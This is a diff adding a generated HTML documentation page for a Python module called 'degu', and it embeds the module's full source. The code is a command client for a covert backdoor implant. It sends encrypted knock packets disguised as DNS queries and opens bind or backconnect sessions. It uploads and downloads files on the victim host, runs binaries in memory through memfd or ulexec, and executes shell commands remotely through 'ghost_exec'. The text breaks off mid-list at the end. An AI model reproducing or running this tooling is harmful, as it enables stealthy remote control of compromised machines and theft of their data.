@@ -1,0 +1,2198 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
+<meta name="generator" content="pdoc 0.10.0" />
+<title>degu API documentation</title>
+<meta name="description" content="" />
+<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" crossorigin>
+<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" crossorigin>
+<link rel="stylesheet preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" crossorigin>
+<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
+<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
+<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" crossorigin></script>
+<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
+</head>
+<body>
+<main>
+<article id="content">
+<header>
+<h1 class="title">Module <code>degu</code></h1>
+</header>
+<section id="section-intro">
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">#!/usr/bin/env python3
+
+import socket
+import ctypes
+import logging
+import binascii
+import os
+import time
+import struct
+import threading
+import random
+import string
+import sys
+
+
+DEGU=&#34;../degu.so&#34;
+DEGU_EXE_UL     = b&#34;&lt;o)~&#34;
+DEGU_EXE_MEMFD  = b&#34;&lt;o):&#34;
+DEGU_DL         = b&#34;Oo&lt;&lt;&#34;
+DEGU_UP         = b&#34;Oo&gt;&gt;&#34;
+
+class LogFmt(logging.Formatter):
+    &#34;&#34;&#34; class for log formating &#34;&#34;&#34;
+
+    def __init__(self):
+        logging.Formatter.__init__(self)
+
+    def format_time(self):
+        &#34;&#34;&#34; format time &#34;&#34;&#34;
+        return time.strftime(&#34;%H:%M.%S&#34;)
+
+    def _l(self,level):
+        clevel = {&#34;DEBUG&#34;    :  (&#34;\033[0;36m&#34;,&#34;\033[1;36m&#34;),
+          &#34;INFO&#34;     :  (&#34;\033[0;37m&#34;,&#34;\033[1;37m&#34;),
+          &#34;WARNING&#34;  :  (&#34;\033[0;31m&#34;,&#34;\033[1;31m&#34;),
+          &#34;CRITICAL&#34; :  (&#34;\033[0;31m&#34;,&#34;\033[1;31m&#34;),
+          &#34;ERROR&#34;    :  (&#34;\033[0;31m&#34;,&#34;\033[1;31m&#34;),
+          }
+        return clevel[level]
+
+    def format(self,record):
+        header = self._l(record.levelname)[0] + &#34;[&#34; + self._l(record.levelname)[1] + &#34;%8s&#34;%record.levelname \
+               + self._l(record.levelname)[1] + &#34;  &#34; + self.format_time() + &#34;][%-5s]: &#34; % record.name + &#34;\033[0m&#34;
+        return header + &#34;\033[0m&#34; + record.msg
+
+LEVEL = logging.DEBUG
+log = logging.getLogger(&#39;degu&#39;)
+log.setLevel(LEVEL)
+ch = logging.StreamHandler()
+ch.setFormatter(LogFmt())
+log.addHandler(ch)
+
+def mock_dns():
+    &#34;&#34;&#34;generate random dns query for degu knock
+
+    Returns:
+        byte: first 32 bytes of DNS query header
+    &#34;&#34;&#34;    
+    
+    names = [&#34;google.com&#34;,&#34;youtube.com&#34;,&#34;facebook.com&#34;,&#34;wikipedia.org&#34;,&#34;yahoo.com&#34;,&#34;amazon.com&#34;,
+    &#34;twitter.com&#34;,&#34;live.com&#34;,&#34;instagram.com&#34;,&#34;reddit.com&#34;,&#34;linkedin.com&#34;,&#34;blogspot.com&#34;,&#34;netflix.com&#34;,
+    &#34;twitch.tv&#34;,&#34;whatsapp.com&#34;,&#34;microsoft.com&#34;,&#34;bing.com&#34;,&#34;ebay.com&#34;,&#34;github.com&#34;,&#34;stackoverflow.com&#34;,
+    &#34;office.com&#34;,&#34;msn.com&#34;,&#34;paypal.com&#34;,&#34;imgur.com&#34;,&#34;wordpress.com&#34;,&#34;apple.com&#34;,&#34;dropbox.com&#34;,
+    &#34;tumblr.com&#34;,&#34;bbc.com&#34;,&#34;force.com&#34;,&#34;salesforce.com&#34;,&#34;roblox.com&#34;,&#34;spotify.com&#34;,&#34;soundcloud.com&#34;,
+    &#34;discordapp.com&#34;,&#34;medium.com&#34;,&#34;mediafire.com&#34;,&#34;godaddy.com&#34;,&#34;etsy.com&#34;,&#34;duckduckgo.com&#34;,
+    &#34;slack.com&#34;,&#34;dailymotion.com&#34;,&#34;speedtest.net&#34;,&#34;blogger.com&#34;]
+
+    transac_id = struct.pack(&#34;H&#34;,random.randint(0,65535))
+    flags = b&#34;\x01\x00\x00\x01\x00\x00\x00\x00\x00&#34;
+    name = random.choice(names)
+    len_name = struct.pack(&#34;&gt;H&#34;,len(name))
+    rest = b&#34;\x00\x01\x00\x01&#34;
+    dns_data = transac_id + flags + len_name + name.encode() + rest + 32*b&#34;\x00&#34;
+    return dns_data[:32]
+
+
+def create_bin_string(bin, args, memfd=False):
+    &#34;&#34;&#34; create payload for memory execution
+
+    Args:
+        bin (byte): binary to send
+        args (byte[]): argument to binary don&#39;t forget args[0] for exe name
+        memfd (bool, optional): use memfd instead of ulexec. Defaults to False.
+
+    Returns:
+        byte: unencrypted byte stream to send
+    &#34;&#34;&#34; 
+    mybin = open(bin ,&#34;rb&#34;).read()
+    lbin = struct.pack(&#34;I&#34;,len(mybin))
+    argc = struct.pack(&#34;B&#34;,len(args.split()))
+    largs = struct.pack(&#34;I&#34;,len(args))
+    payload=b&#34;&#34;
+    if memfd:
+        payload += DEGU_EXE_MEMFD
+    else:
+        payload += DEGU_EXE_UL
+
+    payload += lbin + largs + argc + args + mybin
+    size = len(payload)
+    delta = 32 - (size % 32)
+    data = payload + delta * b&#34;\0&#34;
+    return data
+
+def create_dl_string(path):
+    &#34;&#34;&#34;create payload for file download
+
+    Args:
+        path (byte): file path on server to download
+
+    Returns:
+        byte: unencrypted byte stream to send
+    &#34;&#34;&#34;    
+    lpath = struct.pack(&#34;I&#34;,len(path))
+    payload = DEGU_DL + lpath + path
+    size = len(payload)
+    delta = 32 - (size % 32)
+    data = payload + delta * b&#34;\0&#34;
+    return data
+
+def create_up_string(path,file):
+    &#34;&#34;&#34;create payload for file upload
+
+    Args:
+        path (byte): path to upload to
+        file (byte): local file to read
+
+    Returns:
+        byte: unencrypted byte stream to send
+    &#34;&#34;&#34;    
+    lpath = struct.pack(&#34;I&#34;,len(path))
+    data = None
+    try:
+        data = open(file,&#34;rb&#34;).read()
+    except FileNotFoundError:
+        log.error(f&#34;file {path} not found&#34;)
+        return None
+    ldata = struct.pack(&#34;I&#34;,len(data))
+    payload = DEGU_UP + ldata + lpath + path + data
+    size = len(payload)
+    delta = 32 - (size % 32)
+    data = payload + delta * b&#34;\0&#34;
+    return data
+
+class degu(object):
+    def __init__(self,host,priv,kport=53,lib=DEGU):
+        &#34;&#34;&#34;main degu object
+
+        Args:
+            host (str): ip addr or hostname of degu server
+            priv (str): hex stream of private data key (01020304....)
+            kport (int): custom knock port for non root degu . Defaults to 53 for root usage.
+            lib (str, optional): degu.so library location . Defaults to DEGU global variable.
+        &#34;&#34;&#34;        
+        self.priv = binascii.unhexlify(priv)
+        self.lib = lib
+        self.log = logging.getLogger(__name__)
+        try:
+            os.putenv(&#34;_LC&#34;,&#34;1&#34;)
+            self.lib =  ctypes.CDLL(self.lib)
+        except OSError:
+            self.log.error(&#34;no degu lib found&#34;)
+            sys.exit(-1)
+        self.host = host
+        self.kport = kport
+        self.bot_pubkey = None
+        self.s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+
+    def xbuf(self,data):
+        &#34;&#34;&#34;encrypt/decrypt data with session context
+
+        Args:
+            data (byte): data to cipher with current aes context
+
+        Returns:
+            byte: ciphered data
+        &#34;&#34;&#34;        
+        if not data:
+            return None
+        self.lib.xbuf(self.bot_pubkey,self.priv,data,len(data))
+        return data
+
+    def xcrypt_knock(self,data):
+        &#34;&#34;&#34;encrypt knock data with knock key
+
+        Args:
+            data (byte): knock to cipher/decipher
+
+        Returns:
+            byte: ciphered/deciphered data
+        &#34;&#34;&#34;        
+        
+        self.lib.xnock(data,len(data))
+        return data
+
+    def sign_msg(self,data):
+        &#34;&#34;&#34;get data signature
+
+        Args:
+            data (byte): data to sign
+
+        Returns:
+            byte: signature
+        &#34;&#34;&#34;        
+        sig = ctypes.create_string_buffer(64)
+        self.lib.xsig(sig,data,len(data),self.priv)
+        return sig.raw
+
+    def mkbuf_knock(self,addr):
+        &#34;&#34;&#34;make knock message
+
+        Args:
+            addr (byte): target host
+
+        Returns:
+            byte: ciphered knock buffer with DNS header
+        &#34;&#34;&#34;        
+
+        buf_rand = mock_dns()
+        self.xcrypt_knock(buf_rand)
+        self.log.debug(&#34;knocking %s&#34;%addr)
+        payload = None
+        if addr.startswith(b&#34;:&#34;):
+            try:
+                port = int(addr[1:])
+                self.port = port
+                self.log.debug(&#34;trying remote bind on %s:%i&#34;%(self.host,port))
+                f = struct.pack(&#34;H&#34;,port)
+                payload = buf_rand + b&#34;\xb0\x0b&#34; + f + b&#34;\0&#34;*1000
+            except ValueError:
+                self.log.error(f&#34;Port {addr[1:]} is invalid&#34;)
+        else:
+            try:
+                sip,sport = addr.split(b&#34;:&#34;)
+                self.log.debug(f&#34;trying backconnect on {sip}:{sport}&#34;)
+                ip = bytes(map(int, sip.split(b&#39;.&#39;)))
+                port = int(sport)
+                f = struct.pack(&#34;H&#34;,port)
+                payload = buf_rand + b&#34;\xc4\x11&#34; + ip + f + b&#34;\0&#34;*1000
+            except Exception as exc:
+                self.log.error(&#34;addr %s is invalid : %s&#34;%(addr,exc))
+        if payload:
+            return self.xcrypt_knock( payload )
+        return None
+
+    def mkbuf_upload( self, file , path, pub ):
+        &#34;&#34;&#34;make upload buffer
+
+        Args:
+            file (byte): local filename to read
+            path (byte): remote path to use for upload
+            pub (byte): public key of degu instance
+
+        Returns:
+            byte: ciphered upload data command
+        &#34;&#34;&#34;        
+
+        if not self.bot_pubkey :
+            self.bot_pubkey = self.xcrypt_knock( pub )
+        data = create_up_string( path , file )
+        return self.xbuf( data )
+        
+    def mkbuf_mem_exec(self, bin, param, pub, memfd=False):
+        &#34;&#34;&#34;make memexec buffer
+
+        Args:
+            bin (byte): binary to send
+            param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+            pub (byte): public key of degu instance
+            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.
+
+        Returns:
+            byte: encrypted byte buffer to send
+
+        &#34;&#34;&#34;        
+    
+        if not self.bot_pubkey :
+            self.bot_pubkey = self.xcrypt_knock( pub )
+        data = create_bin_string( bin, param, memfd=memfd )
+        return self.xbuf( data )
+
+    def mkbuf_download(self,path,pub):
+        &#34;&#34;&#34; make download buffer
+
+        Args:
+            path (byte): file path on server to download
+            pub (byte): public key of degu instance
+
+        Returns:
+            byte: encrypted byte buffer to send
+        &#34;&#34;&#34;
+        if not self.bot_pubkey :            
+            self.bot_pubkey = self.xcrypt_knock(pub) ## here for user !!!!
+        data = create_dl_string( path )
+        return self.xbuf(data)
+
+    def mkbuf_ghost_exec(self,mycmd):
+        &#34;&#34;&#34;make ghost exec buffer
+
+        Args:
+            mycmd (byte): raw shell command
+
+        Returns:
+            byte: encrypted byte buffer to send
+        &#34;&#34;&#34;        
+
+        rand = mock_dns()
+        self.xcrypt_knock(rand)
+        sig  = self.sign_msg(mycmd)
+        payload = rand + b&#34;\xc0\x57&#34; + struct.pack(&#34;H&#34;,len(mycmd)) +  mycmd + sig + b&#39;\x00&#39;*1000
+        return self.xcrypt_knock(payload)
+
+    def rdownload(self,path,lport,timeout=5):
+        &#34;&#34;&#34; reverse connect download file from bot to client
+
+        Args:
+            path (byte): file path on server to download
+            lport (int): local port to listen to
+            timeout (int, optional): timeout to file receive. Defaults to 5.
+
+        Returns:
+            byte: contents of file or None if error
+        &#34;&#34;&#34;        
+
+        self.log.info(f&#34;CB downloading {path.decode()}&#34;)
+        serv = socket.socket()
+        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+        serv.settimeout(timeout)
+        serv.listen(512)
+        s, _ = serv.accept()
+        pub = s.recv(32)
+        data = self.mkbuf_download(path,pub)
+        s.send(data)
+        recvdata = b&#34;&#34;
+        while 1:
+            tmp = s.recv(4096)
+            if tmp :
+                recvdata += tmp
+            else :
+                break
+        if len(recvdata) &gt; 4:
+            self.xbuf(recvdata)
+            lmsg = struct.unpack(&#34;&gt;I&#34;,recvdata[:4])[0]
+            s.close()
+            return recvdata[4:lmsg+4]
+        else:
+            self.log.error(&#34;no recv :(&#34;)
+        s.close()
+        return None
+
+    def download(self, path ):
+        &#34;&#34;&#34; bind connect download file from bot to client
+
+        Args:
+            path (byte): file path on server to download
+
+        Returns:
+            byte: contents of file or None if error
+        &#34;&#34;&#34;        
+        
+        self.log.info(f&#34;Downloading {path.decode()}&#34;)
+        s = socket.socket()
+        s.connect((self.host,self.port))
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+        pub = s.recv(32)
+        data = self.mkbuf_download(path,pub)
+        s.send(data)
+        recvdata = b&#34;&#34;
+        while 1:
+            tmp = s.recv(4096)
+            if tmp :
+                recvdata += tmp
+            else :
+                break
+        if len(recvdata) &gt; 4:
+            self.xbuf(recvdata)
+            lmsg = struct.unpack(&#34;&gt;I&#34;,recvdata[:4])[0]
+            s.close()
+            return recvdata[4:lmsg+4]
+        else:
+            self.log.error(&#34;no recv :(&#34;)
+        s.close()
+        return None
+
+    def upload(self, file , path ):
+        &#34;&#34;&#34;bind connect upload file from client to bot
+
+        Args:
+            file (byte): local filename to read
+            path (byte): remote path to use for upload
+        Returns:
+            int: len of uploaded data or None
+        &#34;&#34;&#34;        
+        self.log.info(f&#34;Uploading {file.decode()} {path.decode()}&#34;)
+        s = socket.socket()
+        s.connect((self.host,self.port))
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+        pub = s.recv(32)
+        data = self.mkbuf_upload(file, path, pub)
+        if not data :
+            return None
+        ret = s.send(data)
+        s.close()
+        return ret
+
+    def rupload(self, file , path, lport, timeout=5 ):
+        &#34;&#34;&#34; reverse connect upload file from client to bot
+
+        Args:
+            file (byte): local filename to read
+            path (byte): remote path to use for upload
+            lport (int): local port to listen to
+            timeout (int, optional): timeout to file send. Defaults to 5.
+
+        Returns:
+            int: len of uploaded data or None
+        &#34;&#34;&#34;        
+
+        self.log.info(f&#34;cb Uploading {file.decode()} {path.decode()}&#34;)
+        serv = socket.socket()
+        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+        serv.settimeout(timeout)
+        serv.listen(512)
+        s, _ = serv.accept()
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+        pub = s.recv(32)
+        data = self.mkbuf_upload(file, path, pub)
+        if not data :
+            return None
+        ret = s.send(data)
+        s.close()
+        return ret
+
+    def helper(self, bin, param, memfd=False):
+        &#34;&#34;&#34; bind connect execute binary in memory and return socket for reuse
+
+        Args:
+            bin (byte): helper binary to use
+            param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.
+
+        Returns:
+            socket: socket object from degu session
+        &#34;&#34;&#34;        
+        self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+        s = socket.socket()
+        s.connect((self.host,self.port))
+        pub = s.recv(32)
+        data = self.mkbuf_mem_exec(bin, param, pub, memfd=memfd)
+        s.send(data)
+        return s
+
+    def rhelper(self, bin, param, lport, timeout=5, memfd=False):
+        &#34;&#34;&#34; reverse connect execute binary in memory and return socket for reuse
+
+        Args:
+            bin (byte): helper binary to use
+            param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+            lport (int): local port to listen to
+            timeout (int, optional): timeout to file send. Defaults to 5.
+            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.
+
+        Returns:
+            socket: socket object from degu session
+        &#34;&#34;&#34;
+        self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+        serv = socket.socket()
+        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+        serv.settimeout(timeout)
+        serv.listen(512)
+        s, _ = serv.accept()
+        pub = s.recv(32)
+        data = self.mkbuf_mem_exec(bin, param, pub,memfd=memfd)
+        s.send(data)
+        return s
+
+    def mem_exec(self, bin, param):
+        &#34;&#34;&#34; bind connect execute binary in memory and close socket
+
+        Args:
+            bin (byte): executable binary to use
+            param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+        &#34;&#34;&#34;        
+
+        self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+        s = socket.socket()
+        s.connect((self.host,self.port))
+        pub = s.recv(32)
+        data = self.mkbuf_mem_exec(bin, param, pub)
+        s.send(data)
+        s.close()
+
+    def rmem_exec(self, bin, param, lport, timeout=5):
+        &#34;&#34;&#34; reverse connect execute binary in memory and close socket
+
+        Args:
+            bin (byte): executable binary to use
+            param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+            lport (int): local port to listen to
+            timeout (int, optional): timeout to file send. Defaults to 5.
+        &#34;&#34;&#34;
+        self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+        serv = socket.socket()
+        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+        serv.settimeout(timeout)
+        serv.listen(512)
+        s, _ = serv.accept()
+        pub = s.recv(32)
+        data = self.mkbuf_mem_exec(bin, param, pub)
+        s.send(data)
+        s.close()
+
+    def knock(self,data):
+        &#34;&#34;&#34; send knock to bot
+
+        Args:
+            data (byte): knock message ip:port for cb or just :port for bind
+        &#34;&#34;&#34;        
+
+        buf = self.mkbuf_knock(data)
+        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+        s.sendto(buf,0,(self.host,self.kport))
+        s.close()
+
+    def ghost_exec(self, mycmd):
+        &#34;&#34;&#34; execute system() command on bot, limited cmd to 1300 char no return
+
+        Args:
+            mycmd (byte): shell command
+        &#34;&#34;&#34;        
+
+        self.log.info(f&#34;ghost executing {mycmd}&#34;)
+        buf = self.mkbuf_ghost_exec(mycmd)
+        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+        self.log.debug(&#34;executing : %s&#34;%mycmd)
+        s.sendto(buf,0,(self.host,self.kport))
+        s.close()
+
+    def __str__(self):
+        return f&#34;&lt;DEGU ({self.host})&gt;&#34;
+
+    def __repr__(self):
+        return f&#34;&lt;DEGU ({self.host})&gt;&#34;
+
+    @staticmethod
+    def getpub():
+        &#34;&#34;&#34; get degu internal info &#34;&#34;&#34;
+        lib = ctypes.CDLL(DEGU)
+        lib.xpub()
+
+    @staticmethod
+    def keygen():
+        &#34;&#34;&#34; degu keygen function &#34;&#34;&#34;
+        file = &#39;/tmp/.&#39; + &#39;&#39;.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
+        lib =  ctypes.CDLL(DEGU)
+        lib.keygen(file.encode())
+        toexec = open(file,&#34;rb&#34;).read()
+        exec( toexec, globals() )
+        os.unlink(file)
+        tiv  = [&#34;0x%02x&#34;%c for c in binascii.unhexlify(iv)]
+        tkno = [&#34;0x%02x&#34;%c for c in binascii.unhexlify(knock)]
+        tpub = [&#34;0x%02x&#34;%c for c in binascii.unhexlify(pub)]
+        ret  = &#34;#define IV            { &#34; + &#34;,&#34;.join(tiv) + &#34;}\n&#34;
+        ret += &#34;#define KNOCK_KEY     { &#34; + &#34;,&#34;.join(tkno) + &#34;}\n&#34;
+        ret += &#34;#define MASTER_PUBKEY { &#34; + &#34;,&#34;.join(tpub) + &#34;}\n&#34;
+        ret += f&#39;\n// PRIVATE_KEY=&#34;{priv}&#34;\n&#39;
+        return ret</code></pre>
+</details>
+</section>
+<section>
+</section>
+<section>
+</section>
+<section>
+<h2 class="section-title" id="header-functions">Functions</h2>
+<dl>
+<dt id="degu.create_bin_string"><code class="name flex">
+<span>def <span class="ident">create_bin_string</span></span>(<span>bin, args, memfd=False)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>create payload for memory execution</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>bin</code></strong> :&ensp;<code>byte</code></dt>
+<dd>binary to send</dd>
+<dt><strong><code>args</code></strong> :&ensp;<code>byte[]</code></dt>
+<dd>argument to binary don't forget args[0] for exe name</dd>
+<dt><strong><code>memfd</code></strong> :&ensp;<code>bool</code>, optional</dt>
+<dd>use memfd instead of ulexec. Defaults to False.</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>unencrypted byte stream to send</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def create_bin_string(bin, args, memfd=False):
+    &#34;&#34;&#34; create payload for memory execution
+
+    Args:
+        bin (byte): binary to send
+        args (byte[]): argument to binary don&#39;t forget args[0] for exe name
+        memfd (bool, optional): use memfd instead of ulexec. Defaults to False.
+
+    Returns:
+        byte: unencrypted byte stream to send
+    &#34;&#34;&#34; 
+    mybin = open(bin ,&#34;rb&#34;).read()
+    lbin = struct.pack(&#34;I&#34;,len(mybin))
+    argc = struct.pack(&#34;B&#34;,len(args.split()))
+    largs = struct.pack(&#34;I&#34;,len(args))
+    payload=b&#34;&#34;
+    if memfd:
+        payload += DEGU_EXE_MEMFD
+    else:
+        payload += DEGU_EXE_UL
+
+    payload += lbin + largs + argc + args + mybin
+    size = len(payload)
+    delta = 32 - (size % 32)
+    data = payload + delta * b&#34;\0&#34;
+    return data</code></pre>
+</details>
+</dd>
+<dt id="degu.create_dl_string"><code class="name flex">
+<span>def <span class="ident">create_dl_string</span></span>(<span>path)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>create payload for file download</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>path</code></strong> :&ensp;<code>byte</code></dt>
+<dd>file path on server to download</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>unencrypted byte stream to send</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def create_dl_string(path):
+    &#34;&#34;&#34;create payload for file download
+
+    Args:
+        path (byte): file path on server to download
+
+    Returns:
+        byte: unencrypted byte stream to send
+    &#34;&#34;&#34;    
+    lpath = struct.pack(&#34;I&#34;,len(path))
+    payload = DEGU_DL + lpath + path
+    size = len(payload)
+    delta = 32 - (size % 32)
+    data = payload + delta * b&#34;\0&#34;
+    return data</code></pre>
+</details>
+</dd>
+<dt id="degu.create_up_string"><code class="name flex">
+<span>def <span class="ident">create_up_string</span></span>(<span>path, file)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>create payload for file upload</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>path</code></strong> :&ensp;<code>byte</code></dt>
+<dd>path to upload to</dd>
+<dt><strong><code>file</code></strong> :&ensp;<code>byte</code></dt>
+<dd>local file to read</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>unencrypted byte stream to send</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def create_up_string(path,file):
+    &#34;&#34;&#34;create payload for file upload
+
+    Args:
+        path (byte): path to upload to
+        file (byte): local file to read
+
+    Returns:
+        byte: unencrypted byte stream to send
+    &#34;&#34;&#34;    
+    lpath = struct.pack(&#34;I&#34;,len(path))
+    data = None
+    try:
+        data = open(file,&#34;rb&#34;).read()
+    except FileNotFoundError:
+        log.error(f&#34;file {path} not found&#34;)
+        return None
+    ldata = struct.pack(&#34;I&#34;,len(data))
+    payload = DEGU_UP + ldata + lpath + path + data
+    size = len(payload)
+    delta = 32 - (size % 32)
+    data = payload + delta * b&#34;\0&#34;
+    return data</code></pre>
+</details>
+</dd>
+<dt id="degu.mock_dns"><code class="name flex">
+<span>def <span class="ident">mock_dns</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>generate random dns query for degu knock</p>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>first 32 bytes of DNS query header</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def mock_dns():
+    &#34;&#34;&#34;generate random dns query for degu knock
+
+    Returns:
+        byte: first 32 bytes of DNS query header
+    &#34;&#34;&#34;    
+    
+    names = [&#34;google.com&#34;,&#34;youtube.com&#34;,&#34;facebook.com&#34;,&#34;wikipedia.org&#34;,&#34;yahoo.com&#34;,&#34;amazon.com&#34;,
